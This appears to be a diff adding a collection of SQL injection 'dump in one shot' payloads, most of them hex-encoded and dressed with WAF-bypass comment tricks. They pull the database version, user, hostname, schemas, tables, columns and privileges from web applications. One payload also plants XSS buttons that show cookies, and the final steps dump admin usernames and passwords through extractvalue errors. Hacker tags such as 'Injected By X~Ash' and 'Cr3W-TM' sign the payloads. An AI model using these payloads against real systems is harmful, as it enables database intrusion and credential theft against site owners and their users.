@@ -1,0 +1,76 @@
+concat(0x3c6d61726b3e3c623e3c666f6e7420636f6c6f723d22726564223e496e6a656374656420427920587e417368203c2f666f6e743e3c2f623e3c2f6d61726b3e,0x3c62723e75736572203d3e20,user(),0x3c62723e76657273696f6e203d3e20,version(),0x3c62723e6461746162617365203d3e20,database(),0x3c62723e3c62723e3c623e3c666f6e7420636f6c6f723d22726564223e50524956494c414745533c2f666f6e743e3c2f623e3c62723e,(select(@z)from(select(@z:=0x00) ,(select(@z)from(information_schema.user_privileges)where(@z)IN(@z:=concat(0x20,@z,grantee,0x202d3e20,Is_grantable,0x202d3e20,prIvilege_type,0x3c62723e))))z),0x3c62723e3c623e3c666f6e7420636f6c6f723d22726564223e58535320425554544f4e3c2f666f6e743e3c2f623e3c62723e,0x3c627574746f6e206f6e636c69636b3d2270726f6d707428646f63756d656e742e646f6d61696e2c27454e2729223e444f4d41494e3c2f627574746f6e3e266e6273703c627574746f6e206f6e636c69636b3d2270726f6d707428646f63756d656e742e636f6f6b69652c27454e2729223e434f4f4b49453c2f627574746f6e3e266e6273703c627574746f6e206f6e636c69636b3d2270726f6d707428646f63756d656e742e6c6173744d6f6469666965642c274b4e2729223e444154452654494d453c2f627574746f6e3e266e6273703c627574746f6e206f6e636c69636b3d2270726f6d7074286c6f636174696f6e2e70726f746f636f6c2c27454e2729223e4c4f434154494f4e5f50524f544f434f4c3c2f627574746f6e3e266e6273703c627574746f6e206f6e636c69636b3d2270726f6d707428646f63756d656e742e74657874436f6e74656e742c27454e2729223e544558545f434f4e54454e543c2f627574746f6e3e266e6273703c627574746f6e206f6e636c69636b3d2270726f6d707428646f63756d656e742e7469746c652c27454e2729223e5449544c453c2f627574746f6e3e266e6273703c627574746f6e206f6e636c69636b3d2270726f6d7074286e6176696761746f722e757365724167656e742c27454e2729223e555345525f4147454e543c2f627574746f6e3e266e6273703c627574746f6e206f6e636c69636b3d2270726f6d707428646f63756d656e742e6368617261637465725365742c27454e2729223e4348415241435445525f53455454494e473c2f627574746f6e3e3c62723e3c627574746f6e206f6e636c69636b3d2270726f6d7074286e6176696761746f722e617070436f64654e616d652c27454e2729223e4150505f434f44455f4e414d453c2f627574746f6e3e266e6273703c627574746f6e206f6e636c69636b3d2270726f6d7074286e6176696761746f722e61707056657273696f6e2c27454e2729223e4150505f56455253494f4e3c2f627574746f6e3e266e6273703c627574746f6e206f6e636c69636b3d2270726f6d7074286e6176696761746f722e636f6f6b6965456e61626c65642c27454e2729223e434f4f4b49455f454e41424c45443c2f627574746f6e3e266e6273703c627574746f6e206f6e636c69636b3d2270726f6d7074286e6176696761746f722e6c616e67756167652c27454e2729223e4c414e47554147453c2f627574746f6e3e,0x3c62723e3c62723e3c623e3c666f6e7420636f6c6f723d22726564223e44554d502044415441424153453c2f666f6e743e3c2f623e3c62723e,(select(@x)from(select(@x:=%30%78%30%30),(select(0)from(information_schema.columns)where(table_schema=database())and(%30%78%30%30)in(@x:=concat+(@x,0x3c6c693e,table_name,0x203d3e20,column_name))))x))
+
+
+concat_ws('<br>','zet',database(),version(),user(),@@hostname,(select(group_concat('<br>',table_name,':',column_name))from(information_schema.columns)where(table_Schema=database())))
+
+
+(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20(information_schema.schemata)%20where%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,schema_name))))x)
+
+
+(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20(information_schema.tables)%20where%20(table_schema=database())%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,table_name))))x)
+
+
+concat(@c:=0x00,if((select%20count(*)%20from%20information_schema.columns%20where%20table_schema%20not%20like%200x696e666f726d6174696f6e5f736368656d61%20and%20@c:=concat(@c,0x3c62723e,table_name,0x2e,column_name)),0x00,0x00),@c)
+
+
+concat%0b(@c:=0x00,if((select%20count(*)%20from%20/*!50000information_schema*/.columns%20/*!50000where*/%20table_schema%20not%20like%200x696e666f726d6174696f6e5f736368656d61%20and%20@c:=concat%0b(@c,0x3c62723e,/*!50000table_name*/,0x2e,/*!50000column_name*/)),0x00,0x00),@c)
+
+
+concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0)%20from(information_schema./**/columns)where(table_schema=database())%20and(0x00)in(@x:=Concat/*!(@x,%200x3c62723e,%20if(%20(@tbl!=table_name),%20Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1,%202,%200x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e),%200x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/
+
+
+export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)
+
+
+(select+concat(0x3c666f6e7420666163653d43616d627269612073697a653d323e72306f74404833583439203a3a20,version(),0x3c666f6e7420636f6c6f723d7265643e3c62723e,0x446174616261736573203a7e205b,(Select+count(Schema_name)from(information_Schema.schemata)),0x5d3c62723e5461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)),0x5d3c62723e436f6c756d6e73203a7e205b,(Select+count(column_name)from(information_Schema.columns)),0x5d3c62723e,@)from(select(@:=0x00),(@db:=0),(@db_nr:=0),(@tbl:=0),(@tbl_nr:=0),(@col_nr:=0),(select(@)from(information_Schema.columns)where(@)in(@:=concat(@,if((@db!=table_schema),concat((@tbl_nr:=0x00),0x3c666f6e7420636f6c6f723d7265643e,LPAD(@db_nr:=@db_nr%2b1,2,0x20),0x2e20,@db:=table_schema,0x2020202020203c666f6e7420636f6c6f723d707572706c653e207b205461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)where(table_schema=@db)),0x5d7d203c2f666f6e743e3c2f666f6e743e),0x00),if((@tbl!=table_name),concat((@col_nr:=0x00),0x3c646976207374796c653d70616464696e672d6c6566743a343070783b3e3c666f6e7420636f6c6f723d626c75653e202020,LPAD(@tbl_nr:=@tbl_nr%2b1,3,0x0b),%200x2e20,@tbl:=table_name,0x20202020203c666f6e7420636f6c6f723d707572706c653e2020207b2020436f6c756d6e73203a7e20205b,(Select+count(column_name)from(information_Schema.columns)where(table_name=@tbl)),0x5d202f203c666f6e7420636f6c6f723d626c61636b3e205265636f726473203a7e205b,(Select+if%20null(table_rows,0x30)+from+information_schema.tables+where+table_name=@tbl),0x5d207d3c2f666f6e743e3c2f666f6e743e3c2f666f6e743e3c2f6469763e),0x00),concat(0x3c646976207374796c653d70616464696e672d6c6566743a383070783b3e3c666f6e7420636f6c6f723d677265656e3e,LPAD(@col_nr:=@col_nr%2b1,3,0x0b),0x2e20,column_name,0x3c2f666f6e743e3c2f6469763e)))))x)
+
+
++and@x:=concat+(@:=0,(select+count(*)/*!50000from*/information_schema.columns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x3a3a,column_name)),@)/*!50000UNION*/SELECT+
+
+
+(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))
+
+
+(select(@x)from(select(@x:=0x00),(@nr:=0),(@tbl:=0x0),(select(0)from(information_schema.tables)where(table_schema=database())and(0x00)in(@x:=concat_ws(0x20,@x,lpad(@nr:=@nr%2b1,3,0x0b),0x2e20,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e203a3a3a3a3c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e20207b2020436f6c756d6e73203a3a205b3c666f6e7420636f6c6f723d7265643e,(select+count(*)+from+information_schema.columns+where+table_name=@tbl),0x3c2f666f6e743e5d20207d3c2f666f6e743e,0x3c62723e))))x)
+
+
+(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)
+
+
+(/*!50000select*/+concat+(@:=0,(/*!50000select*/+count(*)%20from+/*!50000information_schema.tables*/+WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat+(@,0x3c62723e,/*!50000table_name*/)),@))
+
+
+(SELECT+ARRAY_TO_STRING(ARRAY_AGG(concat(table_name,$$::$$,column_name)::TEXT),$$<li>$$)FROM+information_schema.columns+WHERE+table_schema+NOT+in($$informatio%E2%80%8Bn_schema$$,$$pg_catalog$$))
+
+unhex(hex(/*!50000concat*/(0x3c62723e3c666f6e7420636f6c6f723d22726564222073697a653d2237223e587e41736820497320486572653c2f666f6e743e3c62723e56657273696f6e7e,/*!50000version*/(),0x7e20,@@version_comment,0x3c62723e557365727e,/*!50000user*/(),0x3c62723e5072696d6172792044617461626173657e,/*!database*/(),0x3c62723e3c666f6e7420636f6c6f723d22677265656e223e4e6f204f66204461746162617365737e,(/*!50000select*/ count(/*!50000schema_name*/) from /*!50000information_schema*/.SCHEMATA),0x3c62723e4e6f204f66205461626c65737e,(/*!50000select*/ count(*) from /*!50000information_schema*/.tables where table_schema=/*!database*/()),(/*!50000select*/(@x)from(/*!50000select*/(@x:=0x00),(@xz:=0),(@xx:=0x00),(/*!50000select*/(0)from(/*!50000information_schema*/.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=/*!50000concat*/(@x,0x3c62723e,if((@xx!=table_name),/*!50000concat*/(0x3c2f6469763e,LPAD(@xz:=@xz%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,0x7c7c,/*!50000table_schema*/,0x7c7c3c2f666f6e743e3c666f6e7420636f6c6f723d2279656c6c6f77223e,@xx:=/*!50000table_name*/,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,/*!50000column_name*/,0x3c2f666f6e743e))))x))))
+
+
+/*!00000concat*/(0x3c666f6e7420636f6c6f723d70696e6b2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select (@x) /*!00000from*/ (select (@x:=0x00),(select (0) /*!00000from*/ (information_schema/**/.columns) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))
+
+
+
+concat('<center><font size=6 color=red> Injected By Cr3W-TM </h2></font><br><center><b>HOSTNAME = ',@@hostname,'<br><b>VERSION = ',@@version,'<br><b>UUID Keys = ',UUID/_/(),'<br><b>datadir = ',@@datadir/_/,'<br><b>basedir = ',@@basedir/_/,'<br><b>Symlink = ',@@GLOBAL.have_symlink/_/,'<br><b>SSL = ',@@GLOBAL.have_ssl/_/,'<br><b>port = ',@@port/_/,'<br><b>socket = ',@@SOCKET/_/,'<br><b>plugindir = ',@@PLUGIN_DIR/_/)
+
+
+%0BUNION(%0BSELECT(1),2,3,4,%28group_concat%280b00111100011011000110100100111110,table_name,0b00100000001111100011111000100000,column_name%29%29
+
+
+
+
+** Local dios **
+
+3div@s:=concat/**K**/(0x496e6a65637465642042792065536563204861783072,0x3c62723e,0x56657273696f6e203a3a20,version(),0x3c62723e,0x55736572203a3a20,user(),0x3c62723e,0x4461746162617365203a3a20,database(),0x3c62723e,(select(@a)from(select(@a:=0x00),(select(@a)from(/*!50000information_schema*/.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat/**K**/(@a,/*!50000table_schema*/,0x203a3a20,/*!50000table_name*/,0x203a3a20,/*!50000column_name*/,0x3c62723e))))a))/**/Union/**/Select/**/   payload= @s
+
+
+
+
+** First get tables **
++and /*!50000extractvalue*/(0x0a,/*!50000concat*/(0x0a,(/*!50000select table_name*/ /*!50000from*/ /*!50000information_schema*/.tables /*!50000where*/ /*!50000table_schema*/=database/**_**/() limit 0,1)))
+
+Now get columns
++and /*!50000extractvalue*/(0x0a,/*!50000concat*/(0x0a,(/*!50000select column_name*/ /*!50000from*/ /*!50000information_schema*/.columns /*!50000where*/ /*!50000table_schema*/=database/**_**/() and /*!50000table_name*/=0x61646d696e limit 0,1)))
+
+0x61646d696e is admin from tables
+
+Dump admin_useranme and pass that u got from columns
++and /*!50000extractvalue*/(0x0a,/*!50000concat*/(0x0a,(/*!50000select*/ /*!50000concat*/(admin_username,0x3a,admin_password) /*!50000from*/ admin limit 0,1)))
